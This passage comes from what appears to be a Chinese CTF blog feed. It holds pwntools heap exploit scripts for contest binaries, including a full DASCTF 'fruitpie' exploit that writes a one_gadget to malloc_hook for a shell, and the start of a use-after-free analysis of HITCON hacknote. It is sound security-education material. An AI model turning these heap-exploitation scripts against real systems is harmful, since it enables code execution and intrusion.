punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x61\x61\x61\x61\x61\x61\x61\x61'</span><span class="token punctuation">)</span>resurt <span class="token operator">=</span>  u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'\x00\x00'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> resurt<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx == 0</span>create<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx == 1</span>create<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx == 2</span>create<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token comment">#idx == 3</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span><span class="token string">'\xa1'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#idx == 1</span>main_arena_add_88 <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>malloc_hook_addr <span class="token operator">=</span> main_arena_add_88 <span class="token operator">-</span> <span class="token number">0x68</span>libc_base <span class="token operator">=</span> malloc_hook_addr <span class="token operator">-</span> <span class="token number">0x3c4b10</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span><span class="token keyword">print</span> <span class="token string">"========="</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"========="</span><span class="token comment">#print('libc_base' , hex(libc_base))</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span><span class="token string">'\x31'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span><span class="token string">'\x21'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span><span class="token string">'\x28'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-dasctf_fruitpie</title>
      <link href="//post/pwn-dasctf-fruitpie.html"/>
      <url>//post/pwn-dasctf-fruitpie.html</url>
      
        <content type="html"><![CDATA[<h1 id="DASctf-fruitpie-WP"><a href="#DASctf-fruitpie-WP" class="headerlink" title="DASctf_fruitpie WP"></a>DASctf_fruitpie WP</h1><p>记录下我第一次在比较正式的比赛中做出heap题。</p><span id="more"></span><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="https://img.imgdb.cn/item/606022eb8322e6675cd118c9.png"></p><p>使用readInt函数读入一个数字，并创建一个输入大小的chunk，打印出这个chunk的地址，再要求输入offset，通过输入的offset往改chunk内填写数据，在最后有创建一个chunk。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>readInt函数()返回输入的数字为<code>__int64</code>型，有符号的longlong型，而size[0]为_DWORD型，无符号longlong型，存在整数溢出。</p><p>printf输出创建的chunk的地址，会泄露整个程序的libc基地址。</p><p>对输入的offset没有限制，可以往任意地址区域写。</p><p>若创建一个特别大的chunk，该chunk的地址会里libc段很近，而malloc_hook在libc里。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>输入size_of_malloc为 -1 ，使size[0]得到一个特别大的数字，创建一个特别大的chunk，以靠近malloc_hook。</p><p>通过gdb调试，确定创建的chunk和malloc_hook之间的偏移。（具体过程如下：）</p><p><img src="https://img.imgdb.cn/item/606025c58322e6675cd2ab7c.png"></p><p>得到本次运行时malloc_hook的地址，继续运行让程序输出我们创建的第一个chunk的地址</p><p><img src="https://img.imgdb.cn/item/6060261e8322e6675cd2dbc3.png"></p><p>得到偏移： <strong>0x7ffff7dcdc30 - 0x7ffef79e1010 =  0x1003ecc20</strong></p><p><img src="https://img.imgdb.cn/item/606026838322e6675cd320e8.png"></p><p>到这里我们可以知道，每次程序运行，malloc_hook都在打印出来的地址（我们创建的chunk的地址）处 加0x1003ecc20 的位置。</p><p>而我们可以通过objdump命令算出malloc_hook相对于基地址的偏移，来计算出基地址，计算偏移的过程如下：</p><p>命令为：<code>objdump libc.so.6 -D -M intel | grep __malloc_hook</code></p><p>得到的结果：</p><p><img src="https://img.imgdb.cn/item/606027708322e6675cd3a914.png"></p><p>故我们现在可以算出基地址：即为<strong>chunk的地址</strong> <strong>+</strong> 和malloc_hook的偏移<strong>0x1003ecc20</strong> <strong>—</strong> hook和基地址的偏移 <strong>0x3ebc30</strong> </p><p>即： </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ptr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment">#第一个chunk的地址</span>hook <span class="token operator">=</span> ptr<span class="token operator">+</span><span class="token number">0x1003ECC20</span>               <span class="token comment">#maoolc_hook的地址</span>libcbase <span class="token operator">=</span> hook <span class="token operator">-</span> <span class="token number">0x3ebc30</span>           <span class="token comment">#libc基地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后我们只要往malloc_hook处写入one_gadget即可getshell。</p><p>获取one_gadget如下：</p><p><img src="https://img.imgdb.cn/item/606028fb8322e6675cd481ea.png"></p><p>由于获取的one_gadget都是相对于基地址的偏移，我们只要将偏移加上基地址写入malloc_hook即可在程序再次malloc时getshell</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment">#sh=process('./fruitpie')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com"</span><span class="token punctuation">,</span><span class="token string">"50202"</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./fruitpie'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter the size to malloc:'</span><span class="token punctuation">,</span><span class="token string">'-1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>ptr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>hook <span class="token operator">=</span> ptr<span class="token operator">+</span><span class="token number">0x1003ECC20</span>libcbase <span class="token operator">=</span> hook <span class="token operator">-</span> <span class="token number">0x3ebc30</span><span class="token comment">#0x3ebc30</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>hook<span class="token punctuation">)</span><span class="token comment">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Offset:\n'</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x1003ECC20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gadget <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x10a41c</span> <span class="token comment">#one_gadget 3</span><span class="token comment">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Data:\n'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#0x7f3c9ca72c30 hook</span><span class="token comment">#0x7f3b9c686010</span><span class="token comment">#0x1003ECC20</span><span class="token comment"># 0x4f365 execve("/bin/sh", rsp+0x40, environ)</span><span class="token comment"># constraints:</span><span class="token comment">#   rsp &amp; 0xf == 0</span><span class="token comment">#   rcx == NULL</span><span class="token comment"># 0x4f3c2 execve("/bin/sh", rsp+0x40, environ)</span><span class="token comment"># constraints:</span><span class="token comment">#   [rsp+0x40] == NULL</span><span class="token comment"># 0x10a45c execve("/bin/sh", rsp+0x70, environ) #effective!</span><span class="token comment"># constraints:</span><span class="token comment">#   [rsp+0x70] == NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-uaf1</title>
      <link href="//post/pwn-uaf1.html"/>
      <url>//post/pwn-uaf1.html</url>
      
        <content type="html"><![CDATA[<h1 id="UAF-HITCON-training-hacknote"><a href="#UAF-HITCON-training-hacknote" class="headerlink" title="UAF - [HITCON-training]hacknote"></a>UAF - [HITCON-training]hacknote</h1><h2 id="UAF（Use-After-Free）"><a href="#UAF（Use-After-Free）" class="headerlink" title="UAF（Use After Free）"></a>UAF（Use After Free）</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><span id="more"></span><h2 id="题目分析-HITCON-training-hacknote"><a href="#题目分析-HITCON-training-hacknote" class="headerlink" title="题目分析[HITCON-training]hacknote"></a>题目分析[HITCON-training]hacknote</h2><h3 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h3><h4 id="main："><a href="#main：" class="headerlink" title="main："></a>main：</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 1. Add note          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 2. Delete note       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 3. Print note        "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 4. Exit              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个经典的菜单题</p><p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p><h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  note <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-1Ch]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>put <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        v0<span class="token operator">-></span>content <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">++</span>count<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token operator">-></span><span class="token function">put</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token operator">-></span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？</p><p>我们可以简单来看一下每一个 note 生成的具体流程</p><ol><li><p>程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。</p></li><li><p>程序根据输入的 size 